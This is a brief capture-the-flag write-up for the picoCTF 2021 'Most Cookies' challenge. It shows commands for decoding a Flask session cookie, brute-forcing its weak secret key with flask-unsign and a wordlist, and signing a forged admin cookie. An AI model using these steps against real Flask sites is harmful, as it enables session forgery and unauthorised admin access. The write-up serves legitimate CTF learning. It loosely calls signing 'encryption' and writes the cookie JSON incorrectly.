Date: 9 August, 2022
Author: givememysushi
Challenge-name: Most Cookies - picoCTF 2021
Challenge: change the cookie data into the fake admin cookie and encrypt it back using the same secret key to that of original
Given: code.py - the python code of the website.

Solution:

=== Investigation ===
1. analyzed the code.py 
<result>
	Flask secret key was the randomly selected element of cookie_names list.
	The list of cookie_names was saved for bruteforcing the secret key.
</result>

2. Retrieved the cookie using the cookie editor add-on called "Cookie Quick Manager"

3. Tried to decrypt it with base64

<command>	echo cookie | base64 -d		</command>

<result>	got the cookie format; {"very_auth","blank"}	<result>

=== Exploitation phase ===
1. Generated a wordlist with saved list of cookie_names

<code>
with open('wordlist.txt','w') as f:
	wordlist = cookie_names

	for i in wordlist:
		f.write( "\n" + i )
</code>

2. Used flask-unsign to bruteforce the secret key out of encrypted cookie with the following command:

<command>
	flask-unsign --unsign --cookie <insert_cookie> --wordlist wordlist.txt
</command>

3. Encrypted the fake admin cookie

<command>
	flask-unsign --sign --cookie {"very_auth","admin"} --secret <insert_secret_key>
</command>

4. Assigned the encrypted cookie with cookie editor and refreshed the webpage. Then the flag appeared.

<success>
	picoCTF{flag}
</success>
"# CTF"